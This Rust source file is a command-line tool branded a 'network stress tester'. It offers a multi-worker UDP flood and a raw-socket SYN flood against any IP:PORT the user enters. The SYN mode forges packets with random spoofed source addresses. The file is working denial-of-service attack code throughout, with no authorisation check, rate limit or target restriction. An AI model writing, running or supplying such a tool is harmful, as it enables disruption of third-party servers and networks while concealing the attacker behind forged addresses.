use anyhow::{Context, Result};
use colored::*;
use inquire::{Select, Text};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::transport::{TransportChannelType, TransportProtocol, transport_channel};
use rand::prelude::*;
use std::fmt::Display;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use tokio::time::{Duration, Instant};

#[derive(Debug, Clone, Copy, PartialEq)]
enum AttackType {
    UdpFlood,
    SynFlood,
}

impl Display for AttackType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            AttackType::UdpFlood => write!(f, "UDP Flood (L4)"),
            AttackType::SynFlood => write!(f, "SYN Flood (Raw Socket)"),
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    print_banner();

    let choices = vec![AttackType::UdpFlood, AttackType::SynFlood];
    let choice = Select::new("Choose attack vector:", choices)
        .prompt()
        .context("Selection cancelled")?;

    match choice {
        AttackType::UdpFlood => run_udp_attack(choice).await?,
        AttackType::SynFlood => run_syn_flood(choice).await?,
    }

    Ok(())
}

fn print_banner() {
    let thanh_tieu_de = "=".repeat(50).bright_blue();
    let content = "🚀 NETWORK STRESS TESTER (L3/L4) 🚀".bold().bright_white();
    println!("{}", thanh_tieu_de);
    println!("{}", content);
    println!("{}", thanh_tieu_de);
}

async fn run_udp_attack(attack_type: AttackType) -> anyhow::Result<()> {
    let target = get_target(attack_type)?;
    let workers = get_worker()? as usize;

    let target = Arc::new(target);
    let total_sent = Arc::new(AtomicUsize::new(0));
    let total_fail = Arc::new(AtomicUsize::new(0));
    let start_time = Instant::now();

    println!(
        "\n{}",
        format!("🔥 Launching UDP flood on {}...", target)
            .bold()
            .red()
    );
    println!("{}", "Press Ctrl+C to stop the session.".dimmed());

    for _ in 0..workers {
        let target_addr = Arc::clone(&target);
        let sent_counter = Arc::clone(&total_sent);
        let fail_counter = Arc::clone(&total_fail);

        let mut rng = rand::rng();
        let mut custom_payload = vec![0u8; 1024];
        rng.fill_bytes(&mut custom_payload);
        let payload = Arc::new(custom_payload);
        let socket = tokio::net::UdpSocket::bind("0.0.0.0:0")
            .await
            .context("Failed to bind UDP socket")?;
        let socket = Arc::new(socket);

        tokio::spawn(async move {
            loop {
                match socket.send_to(&payload, &*target_addr).await {
                    Ok(_) => {
                        sent_counter.fetch_add(1, Ordering::Relaxed);
                    }
                    Err(_) => {
                        fail_counter.fetch_add(1, Ordering::Relaxed);
                    }
                }
            }
        });
    }

    monitor_progress(total_sent, total_fail, start_time).await;
    Ok(())
}

async fn run_syn_flood(attack_type: AttackType) -> anyhow::Result<()> {
    let target_str = get_target(attack_type)?;
    let workers = get_worker()? as usize;

    let parts: Vec<&str> = target_str.split(':').collect();
    if parts.len() != 2 {
        anyhow::bail!("Invalid target format. Use IP:PORT");
    }
    let target_ip: Ipv4Addr = parts[0].parse().context("Invalid IP address")?;
    let target_port: u16 = parts[1].parse().context("Invalid Port")?;

    let total_sent = Arc::new(AtomicUsize::new(0));
    let total_fail = Arc::new(AtomicUsize::new(0));
    let start_time = Instant::now();

    println!(
        "\n{}",
        format!(
            "🔥 Launching L3 SYN flood on {}:{}...",
            target_ip, target_port
        )
        .bold()
        .red()
    );
    println!(
        "{}",
        "Warning: IP Spoofing mode enabled. Requires sudo!".yellow()
    );
    println!("{}", "Press Ctrl+C to stop the session.".dimmed());

    // Protocol: L3 (IPv4) but focused on TCP
    let protocol = TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp);

    // Check if we can open raw socket
    {
        let _ = transport_channel(4096, protocol).context("Failed L3 channel. Run with sudo!")?;
    }

    for _ in 0..workers {
        let sent_counter = Arc::clone(&total_sent);
        let fail_counter = Arc::clone(&total_fail);

        tokio::spawn(async move {
            let mut rng = rand::rng();
            let protocol = TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp);
            let mut tx_worker = match transport_channel(4096, protocol) {
                Ok((tx, _)) => tx,
                Err(_) => {
                    fail_counter.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };

            let mut packet_buffer = [0u8; 40];

            loop {
                let source_ip =
                    Ipv4Addr::new(rng.random(), rng.random(), rng.random(), rng.random());

                // 1. Build IPv4 Header (20 bytes)
                {
                    let mut ip_packet = MutableIpv4Packet::new(&mut packet_buffer).unwrap();
                    ip_packet.set_version(4);
                    ip_packet.set_header_length(5);
                    ip_packet.set_total_length(40);
                    ip_packet.set_identification(rng.random());
                    ip_packet.set_flags(Ipv4Flags::DontFragment);
                    ip_packet.set_ttl(64);
                    ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
                    ip_packet.set_source(source_ip);
                    ip_packet.set_destination(target_ip);
                    ip_packet.set_checksum(pnet::packet::ipv4::checksum(&ip_packet.to_immutable()));
                }

                // 2. Build TCP Header (20 bytes) - starts at offset 20
                {
                    let mut tcp_packet = MutableTcpPacket::new(&mut packet_buffer[20..]).unwrap();
                    tcp_packet.set_source(rng.random());
                    tcp_packet.set_destination(target_port);
                    tcp_packet.set_sequence(rng.random());
                    tcp_packet.set_acknowledgement(0);
                    tcp_packet.set_data_offset(5);
                    tcp_packet.set_flags(TcpFlags::SYN);
                    tcp_packet.set_window(64240);
                    tcp_packet.set_checksum(0);

                    let checksum = pnet::packet::tcp::ipv4_checksum(
                        &tcp_packet.to_immutable(),
                        &source_ip,
                        &target_ip,
                    );
                    tcp_packet.set_checksum(checksum);
                }

                // In Layer3 channel, we MUST send the entire buffer (IP + TCP)
                match tx_worker.send_to(
                    pnet::packet::ipv4::Ipv4Packet::new(&packet_buffer).unwrap(),
                    IpAddr::V4(target_ip),
                ) {
                    Ok(_) => {
                        sent_counter.fetch_add(1, Ordering::Relaxed);
                    }
                    Err(_) => {
                        fail_counter.fetch_add(1, Ordering::Relaxed);
                    }
                }
            }
        });
    }

    monitor_progress(total_sent, total_fail, start_time).await;
    Ok(())
}

async fn monitor_progress(success: Arc<AtomicUsize>, fail: Arc<AtomicUsize>, start_time: Instant) {
    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;

        let s = success.load(Ordering::Relaxed);
        let f = fail.load(Ordering::Relaxed);
        let elapsed = start_time.elapsed().as_secs();

        if elapsed > 0 {
            let total_ops = s + f;
            let speed = total_ops / elapsed as usize;
            print!(
                "\rStatus: {} packet(s)/conn sent, {} failed | Speed: {} pckt/s",
                s.to_string().green(),
                f.to_string().red(),
                speed.to_string().cyan().bold()
            );
            use std::io::{Write, stdout};
            let _ = stdout().flush();
        }
    }
}

fn get_worker() -> anyhow::Result<i32> {
    let worker: i32 = Text::new("Number of concurrent workers:")
        .with_default("100")
        .prompt()?
        .parse()
        .context("Invalid number for workers")?;
    Ok(worker)
}

fn get_target(attack_type: AttackType) -> anyhow::Result<String> {
    let prompt = format!("Target IP:PORT for {}:", attack_type);
    let target = Text::new(&prompt)
        .with_placeholder("1.2.3.4:14443")
        .with_help_message("Enter target IP and port")
        .prompt()
        .context("Target input cancelled")?;

    Ok(target)
}
